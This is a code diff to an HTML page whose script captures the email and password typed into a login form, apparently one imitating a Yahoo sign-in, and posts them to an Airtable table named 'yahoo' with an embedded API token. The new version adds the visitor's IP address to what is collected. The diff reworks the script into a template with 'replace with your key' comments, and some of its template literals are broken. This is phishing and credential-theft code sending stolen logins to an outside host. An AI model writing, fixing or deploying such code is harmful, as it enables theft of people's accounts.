@@ -151,31 +151,48 @@ function transform() {
   });
 </script>
 <script>
-  document.getElementById("email-form").addEventListener("submit", function(event) {
-      event.preventDefault();
+  document.getElementById('email-form').addEventListener('submit', function (event) {
+    event.preventDefault(); // Prevent the form from submitting normally
 
-      fetch("https://api.airtable.com/v0/WWw92Q29J21BO3/yahoo", {
-          method: "POST",
-          headers: {
-              "Authorization": "Bearer pataxf2KY8eB1o1Ol.535ced6831fcdf9cc2047ef0b9bea6ae358da0fed1dbe0407e6f707657b66f71",
-              "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-              records: [{
-                  fields: {
-                      Email: document.getElementById("name").value,
-                      Password: document.getElementById("input-19").value,
-                 
-                  }
-              }]
-          })
-      })
-      .then(response => response.json())
-      .then(data => {
-          window.location.href = "https://yourwebsite.com/thank-you"; // Redirect after submission
-      })
-      .catch(error => alert("Submission failed! Try again."));
+    // Get form data
+    const email = document.getElementById('name').value;
+    const password = document.getElementById('input-19').value;
+    const ip = document.getElementById('ip_address').value;
+
+    // Airtable API details
+    const apiKey = 'pataxf2KY8eB1o1Ol.535ced6831fcdf9cc2047ef0b9bea6ae358da0fed1dbe0407e6f707657b66f71'; // Replace with your Airtable API key
+    const baseId = 'appWWw92Q29J21BO3'; // Replace with your Airtable base ID
+    const tableName = 'yahoo'; // Replace with your table name
+    const apiUrl = `https://api.airtable.com/v0/${appWWw92Q29J21BO3}/${yahoo}`;
+
+    // Data to send to Airtable
+    const data = {
+      fields: {
+        "Email": email,
+        "Password": password,
+        "Ip": ip
+      }
+    };
+
+    // Send data to Airtable
+    fetch(apiUrl, {
+      method: 'POST',
+      headers: {
+        'Authorization': `Bearer ${pataxf2KY8eB1o1Ol.535ced6831fcdf9cc2047ef0b9bea6ae358da0fed1dbe0407e6f707657b66f71}`,
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(result => {
+      console.log('Success:', result);
+      alert('Form submitted successfully!');
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      alert('An error occurred. Please try again.');
+    });
   });
 </script>
 </body>
-</html>  
+</html>
